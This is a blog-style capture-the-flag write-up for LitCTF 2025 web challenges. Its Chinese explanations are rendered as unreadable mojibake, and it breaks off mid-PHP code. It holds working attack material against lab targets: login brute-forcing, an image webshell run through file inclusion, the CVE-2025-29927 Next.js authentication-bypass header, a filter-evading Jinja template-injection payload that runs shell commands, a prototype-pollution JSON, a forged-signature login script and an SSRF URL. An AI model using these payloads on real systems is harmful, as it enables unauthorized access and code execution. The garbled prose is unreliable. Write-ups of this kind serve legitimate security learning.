    <content type="html"><![CDATA[<h3 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h3><p>bpæŠ“åŒ…ï¼Œå‘ç°è¿›è¡Œäº†base64ç¼–ç ï¼Œå‘é€åˆ°Intruderæ¨¡å—ï¼Œè®¾ç½®positionå’Œbase64-encode</p><p><img src="/../images/LitCTF2025-web/ef1.png"></p><p>å¼€å§‹çˆ†ç ´ï¼Œå‘ç°302è·³è½¬</p><p><img src="/../images/LitCTF2025-web/ef2.png"></p><p>å¾—åˆ°ç”¨æˆ·å&#x2F;å¯†ç ï¼šadmin&#x2F;passwordï¼Œç™»å½•è¿›å…¥ç®¡ç†åå°ï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p>è¿›è¡Œäº†åç¼€æ£€æµ‹ï¼Œphpæ–‡ä»¶ã€.htaccessæ–‡ä»¶ã€.user.iniæ–‡ä»¶å‡ä¸èƒ½ä¸Šä¼ </p><p>å°è¯•ä¸Šä¼ jpgå›¾ç‰‡é©¬ï¼Œå‘ç°å¯¹å†…å®¹ä¹Ÿè¿›è¡Œäº†æ£€æµ‹ï¼Œå°è¯•ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼Œé‚£å¦‚ä½•åˆ©ç”¨å‘¢</p><p>è¿”å›é˜…è¯»ç™»å½•ç•Œé¢æºç æ—¶å‘ç°</p><p><img src="/../images/LitCTF2025-web/ef3.png"></p><p>å› ä¸ºåå°è¦æ±‚ä¸Šä¼ çš„å°±æ˜¯ä¸€ä¸ªå¤´åƒæ–‡ä»¶ï¼ŒçŒœæµ‹éœ€è¦åˆ©ç”¨fileè¿›è¡Œæ–‡ä»¶åŒ…å«æ“ä½œï¼Œå°è¯•getä¼ å‚</p><p><img src="/../images/LitCTF2025-web/ef4.png"></p><p>ç¡®å®šè¿›è¡Œäº†æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨ä¸Šä¼ çš„å›¾ç‰‡é©¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‹¿åˆ°flag</p><p><img src="/../images/LitCTF2025-web/ef5.png"></p><h3 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h3><p>å¼±å£ä»¤admin&#x2F;passwordç™»å½•åï¼Œç›´æ¥ç»™äº†flagï¼Œéé¢„æœŸäº†</p><p>å»çœ‹äº†å®˜æ–¹çš„wpï¼Œè¿™é¢˜æ˜¯ä»Šå¹´çš„ä¸€ä¸ªCVEï¼šCVE-2025-29927</p><p>çœ‹äº†ä¸€ä¸‹æ¼æ´åŸç†åŠå¤ç°</p><blockquote><p>Next.js åœ¨å†…éƒ¨é€šè¿‡ä¸€ä¸ªåä¸º <em>x-middleware-subrequest</em> çš„è¯·æ±‚å¤´ï¼Œæ¥é˜²æ­¢è‡ªèº«ä¸­é—´ä»¶çš„é€’å½’è°ƒç”¨æˆ–æ— é™å¾ªç¯ã€‚ä½†ç ”ç©¶è€…å‘ç°ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å¤–éƒ¨è¯·æ±‚ä¸­äººä¸ºåŠ ä¸Šæ­¤è¯·æ±‚å¤´ï¼Œå¹¶ä½¿ç”¨ç‰¹å®šæ ¼å¼ï¼Œä½¿ Next.js ä¸­é—´ä»¶ä»¥ä¸ºè¿™æ˜¯ä¸€ä¸ªâ€œå­è¯·æ±‚â€ï¼Œä»è€Œè·³è¿‡åŸæœ¬åº”æ‰§è¡Œçš„è®¤è¯æˆ–å®‰å…¨æ£€æŸ¥ã€‚</p><p>åœ¨è¯·æ±‚ä¸­æ·»åŠ  <code>x-middleware-subrequest</code> è¯·æ±‚å¤´ï¼Œå…¶å€¼ä¸º<code>middleware:middleware:middleware:middleware:middleware</code>ã€‚Next.js ä¸­é—´ä»¶ä¼šé”™è¯¯åœ°å¤„ç†æ­¤è¯·æ±‚å¤´å¹¶ç»•è¿‡èº«ä»½éªŒè¯æ£€æŸ¥ï¼ˆ<a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md%EF%BC%89">https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.mdï¼‰</a></p></blockquote><p>bpæŠ“ä¸€ä¸ªè®¿é—®&#x2F;dashboardè·¯ç”±çš„åŒ…ï¼Œæ·»åŠ è¯¥è¯·æ±‚å¤´ï¼Œå†æ”¾åŒ…</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure><p><img src="/../images/LitCTF2025-web/ntjs.png"></p><h3 id="æ˜Ÿæ„¿ä¿¡ç®±"><a href="#æ˜Ÿæ„¿ä¿¡ç®±" class="headerlink" title="æ˜Ÿæ„¿ä¿¡ç®±"></a>æ˜Ÿæ„¿ä¿¡ç®±</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">è¿‡æ»¤äº†&#123;&#123;&#125;&#125;ï¼Œç”¨&#123;%print()%&#125;ä»£æ›¿å³å¯<br>&#123;%print(url_for[<span class="hljs-string">&quot;__glo&quot;</span><span class="hljs-string">&quot;bals__&quot;</span>][<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>][<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>](<span class="hljs-string">&quot;nl /f*&quot;</span>)[<span class="hljs-string">&quot;re&quot;</span><span class="hljs-string">&quot;ad&quot;</span>]())%&#125;<br></code></pre></td></tr></table></figure><h3 id="å¤šé‡å®‡å®™æ—¥è®°"><a href="#å¤šé‡å®‡å®™æ—¥è®°" class="headerlink" title="å¤šé‡å®‡å®™æ—¥è®°"></a>å¤šé‡å®‡å®™æ—¥è®°</h3><p>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°å°†æ•°æ®åŒ…è£…åœ¨â€œsettingâ€é”®ä¸‹ï¼Œä¸ç»ä»»ä½•å¤„ç†ç›´æ¥å°†åŸå§‹jsonæäº¤ï¼Œå¦‚æœisAdminçš„çŠ¶æ€æ”¹å˜å¯¼èˆªæ ä¾¿ä¼šåˆ·æ–°</p><p>å°†isAdmin: trueæ³¨å…¥åˆ°Object.prototypeï¼Œæ‰“åŸå‹é“¾æ±¡æŸ“</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æäº¤åå‡ºç°ä¸€ä¸ªç®¡ç†å‘˜é¢æ¿</p><p><img src="/../images/LitCTF2025-web/dc.png"></p><p>è®¿é—®å³å¯æ‹¿åˆ°flag</p><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>è®¿é—®é¶æœºï¼ŒæŠ¥403ï¼Œdirsearchæ‰«ä¸€ä¸‹</p><p><img src="/../images/LitCTF2025-web/es1.png"></p><p>è®¿é—®&#x2F;login.htmlï¼Œæ˜¯ä¸€ä¸ªæ–‡æ¡£ç®¡ç†ç³»ç»Ÿçš„ç™»å½•ç•Œé¢ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°äº†ä¸€æ®µå®ç°ç™»å½•è¡¨å•çš„å®¢æˆ·ç«¯éªŒè¯å’Œæäº¤åŠŸèƒ½çš„jsä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>     <span class="hljs-keyword">const</span> loginBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginBtn&#x27;</span>);<br>     <span class="hljs-keyword">const</span> passwordInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;password&#x27;</span>);<br>     <span class="hljs-keyword">const</span> errorTip = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;errorTip&#x27;</span>);<br>     <span class="hljs-keyword">const</span> rawUsername = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;username&#x27;</span>).<span class="hljs-property">value</span>; <br>  <br>     loginBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>         <span class="hljs-keyword">const</span> rawPassword = passwordInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();<br>         <span class="hljs-keyword">if</span> (!rawPassword) &#123;<br>             errorTip.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·è¾“å…¥å¯†ç &#x27;</span>;<br>             errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>             passwordInput.<span class="hljs-title function_">focus</span>();<br>             <span class="hljs-keyword">return</span>;<br>         &#125;<br><br>         <span class="hljs-keyword">const</span> md5Username = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(rawUsername).<span class="hljs-title function_">toString</span>();   <br>         <span class="hljs-keyword">const</span> md5Password = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(rawPassword).<span class="hljs-title function_">toString</span>();   <br>  <br>         <span class="hljs-keyword">const</span> shortMd5User = md5Username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);  <br>         <span class="hljs-keyword">const</span> shortMd5Pass = md5Password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);  <br>       <br>         <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">//äº”åˆ†é’Ÿ</span><br>    <br>         <span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&#x27;easy_signin&#x27;</span>;  <br>         <span class="hljs-keyword">const</span> sign = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(shortMd5User + shortMd5Pass + timestamp + secretKey).<span class="hljs-title function_">toString</span>();<br><br>         <span class="hljs-keyword">try</span> &#123;<br>             <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;login.php&#x27;</span>, &#123;<br>                 <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                 <span class="hljs-attr">headers</span>: &#123;<br>                     <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>                     <span class="hljs-string">&#x27;X-Sign&#x27;</span>: sign  <br>                 &#125;,<br>                 <span class="hljs-attr">body</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(&#123;<br>                     <span class="hljs-attr">username</span>: md5Username,   <br>                     <span class="hljs-attr">password</span>: md5Password,   <br>                     <span class="hljs-attr">timestamp</span>: timestamp<br>                 &#125;)<br>             &#125;);<br><br>             <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>             <span class="hljs-keyword">if</span> (result.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) &#123;<br>                 <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;ç™»å½•æˆåŠŸï¼&#x27;</span>);<br>                 <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;dashboard.php&#x27;</span>; <br>             &#125; <span class="hljs-keyword">else</span> &#123;<br>                 errorTip.<span class="hljs-property">textContent</span> = result.<span class="hljs-property">msg</span>;<br>                 errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>                 passwordInput.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>                 passwordInput.<span class="hljs-title function_">focus</span>();<br>                 <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>), <span class="hljs-number">3000</span>);<br>             &#125;<br>         &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>             errorTip.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;ç½‘ç»œè¯·æ±‚å¤±è´¥&#x27;</span>;<br>             errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>             <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>), <span class="hljs-number">3000</span>);<br>         &#125;<br>     &#125;);<br><br>     passwordInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>         errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>     &#125;);<br> &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼šå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œmd5åŠ å¯†å¤„ç†å¹¶æˆªå–éƒ¨åˆ†å­—ç¬¦ï¼ˆmd5åŠ å¯†åçš„å‰6ä¸ªå­—ç¬¦ï¼‰ï¼Œç»“åˆæ—¶é—´æˆ³å’Œå›ºå®šå¯†é’¥ç”Ÿæˆç­¾åï¼Œé€šè¿‡ fetch API å°†åŠ å¯†åçš„ç”¨æˆ·åã€å¯†ç åŠæ—¶é—´æˆ³å‘é€åˆ°æœåŠ¡å™¨ï¼ŒåŒæ—¶åœ¨è¯·æ±‚å¤´ä¸­æºå¸¦ç­¾åç”¨äºéªŒè¯ï¼›æ ¹æ®æœåŠ¡å™¨è¿”å›ç»“æœï¼ŒæˆåŠŸåˆ™è·³è½¬åˆ°ä»ªè¡¨ç›˜é¡µé¢ã€‚</p><p>æŠ“ä¸€ä¸ªlogin.phpçš„åŒ…ï¼Œè¿›è¡Œçˆ†ç ´ï¼Œå‘ç°ä¸€ä¸ªé•¿åº¦ä¸å…¶ä»–ä¸åŒçš„åŒ…ï¼Œå“åº”ä¸ºï¼šç­¾åéªŒè¯å¤±è´¥</p><p><img src="/../images/LitCTF2025-web/es2.png"></p><p>å¾—åˆ°ç”¨æˆ·å&#x2F;å¯†ç ï¼šadmin&#x2F;admin123</p><p>è¿™é‡Œè®©è±†åŒ…ç”Ÿæˆäº†ä¸€ä¸ªè„šæœ¬å»æ¨¡æ‹Ÿæµè§ˆå™¨è¡Œä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># ç›®æ ‡æœåŠ¡å™¨ä¿¡æ¯</span><br>url = <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:28080/login.php&quot;</span>  <span class="hljs-comment"># æ­£ç¡®çš„ç™»å½•æ¥å£åœ°å€ï¼ˆä¸è¯·æ±‚åŒ…ä¸€è‡´ï¼‰</span><br><br><span class="hljs-comment"># ç™»å½•å‡­è¯</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;admin123&quot;</span><br>secret_key = <span class="hljs-string">&quot;easy_signin&quot;</span> <br><br><span class="hljs-comment"># å¿…è¦çš„è¯·æ±‚å¤´ï¼ˆæ¨¡æ‹Ÿæµè§ˆå™¨è¡Œä¸ºï¼ŒåŒ…å«Cookieå’ŒRefererï¼‰</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;node6.anna.nssctf.cn:28080&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0&quot;</span>,<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>    <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,<br>    <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>,<br>    <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:28080/login.html&quot;</span>,  <span class="hljs-comment"># å¿…é¡»ä¸ç™»å½•é¡µä¸€è‡´ï¼Œé˜²æ­¢è·¨åŸŸé™åˆ¶</span><br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>    <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:28080&quot;</span>,<br>    <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;keep-alive&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;Hm_lvt_648a44a949074de73151ffaa0a832aec=1751986143,1752076394,1752216051; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1752225180; HMACCOUNT=5E14CE8A33189EBE; PHPSESSID=8a052de2c9e042ee53b5c17f252c4880&quot;</span>,  <span class="hljs-comment"># ä»è¯·æ±‚åŒ…å¤åˆ¶ï¼Œä¿æŒä¼šè¯</span><br>    <span class="hljs-string">&quot;Priority&quot;</span>: <span class="hljs-string">&quot;u=0&quot;</span><br>&#125;<br><br><span class="hljs-comment"># MD5åŠ å¯†å‡½æ•°</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-comment"># 1. è®¡ç®—ç”¨æˆ·åå’Œå¯†ç çš„å®Œæ•´MD5</span><br>md5_username = md5(username)  <span class="hljs-comment"># adminçš„MD5ï¼š21232f297a57a5a743894a0e4a801fc3</span><br>md5_password = md5(password)  <span class="hljs-comment"># admin123çš„MD5ï¼š0192023a7bbd73250516f069df18b500</span><br><br><span class="hljs-comment"># 2. æˆªå–å‰6ä½MD5å€¼</span><br>short_md5_user = md5_username[:<span class="hljs-number">6</span>]  <span class="hljs-comment"># 21232f</span><br>short_md5_pass = md5_password[:<span class="hljs-number">6</span>]  <span class="hljs-comment"># 019202</span><br><br><span class="hljs-comment"># 3. ç”Ÿæˆå½“å‰æ—¶é—´æˆ³ï¼ˆæ¯«ç§’çº§ï¼Œç¡®ä¿åœ¨æœåŠ¡å™¨å…è®¸çš„æœ‰æ•ˆæœŸå†…ï¼ŒåŸä»£ç æ³¨é‡Šä¸º5åˆ†é’Ÿï¼‰</span><br>timestamp = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>))<br><br><span class="hljs-comment"># 4. ç”Ÿæˆç­¾åï¼ˆä¸åŸä»£ç é€»è¾‘ä¸€è‡´ï¼‰</span><br>sign_input = short_md5_user + short_md5_pass + timestamp + secret_key<br>sign = md5(sign_input)<br>headers[<span class="hljs-string">&quot;X-Sign&quot;</span>] = sign  <span class="hljs-comment"># å°†ç­¾åæ·»åŠ åˆ°è¯·æ±‚å¤´</span><br><br><span class="hljs-comment"># 5. æ„é€ è¯·æ±‚ä½“</span><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>: md5_username,<br>    <span class="hljs-string">&quot;password&quot;</span>: md5_password,<br>    <span class="hljs-string">&quot;timestamp&quot;</span>: timestamp<br>&#125;<br><br><span class="hljs-comment"># 6. å‘é€ç™»å½•è¯·æ±‚</span><br><span class="hljs-keyword">try</span>:<br>    response = requests.post(url, headers=headers, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æœåŠ¡å™¨å“åº”çŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å“åº”å†…å®¹ï¼š<span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦ç™»å½•æˆåŠŸï¼ˆæ ¹æ®åŸä»£ç ï¼ŒæˆåŠŸä¼šè¿”å›code=200å¹¶è·³è½¬dashboard.phpï¼‰</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        result = response.json()<br>        <span class="hljs-keyword">if</span> result.get(<span class="hljs-string">&quot;code&quot;</span>) == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸï¼å³å°†è·³è½¬è‡³ä»ªè¡¨ç›˜...&quot;</span>)<br>            <span class="hljs-comment"># è‹¥éœ€è¦è‡ªåŠ¨è·³è½¬ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼ˆéœ€å®‰è£…seleniumç­‰å·¥å…·æ¨¡æ‹Ÿæµè§ˆå™¨ï¼‰</span><br>            <span class="hljs-comment"># print(f&quot;ä»ªè¡¨ç›˜åœ°å€ï¼šhttp://node6.anna.nssctf.cn:28080/dashboard.php&quot;)</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç™»å½•å¤±è´¥ï¼š<span class="hljs-subst">&#123;result.get(<span class="hljs-string">&#x27;msg&#x27;</span>)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¼‚å¸¸ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼š<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬åï¼Œä¾¿èƒ½å¤Ÿè®¿é—®ä»ªè¡¨ç›˜é¡µé¢</p><p><img src="/../images/LitCTF2025-web/es3.png"></p><p>è®¿é—®&#x2F;backup&#x2F;8e0132966053d4bf8b2dbe4ede25502b.phpï¼Œæç¤ºéæœ¬åœ°ç”¨æˆ·</p><p>åœ¨&#x2F;login.htmlé¡µé¢çš„æºç ä¸­ï¼Œå‘ç°api.jsï¼ŒæŸ¥çœ‹å…¶æºç å‘ç°å¯ä»¥æ‰“ssrf</p><p><img src="/../images/LitCTF2025-web/es4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">api</span>/sys/urlcode.php?url=<span class="hljs-number">127.0.0.1</span>/backup/<span class="hljs-number">8</span>e0132966053d4bf8b2dbe4ede25502b.php<br></code></pre></td></tr></table></figure><p><img src="/../images/LitCTF2025-web/es5.png"></p><p>åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­å‘ç°327a6c4304ad5938eaf0efb6cc3e53dc.php</p><p><img src="/../images/LitCTF2025-web/es6.png"></p><p>ç›´æ¥è®¿é—®æ‹¿åˆ°flag</p><h3 id="å›ã®åã¯"><a href="#å›ã®åã¯" class="headerlink" title="å›ã®åã¯"></a>å›ã®åã¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span 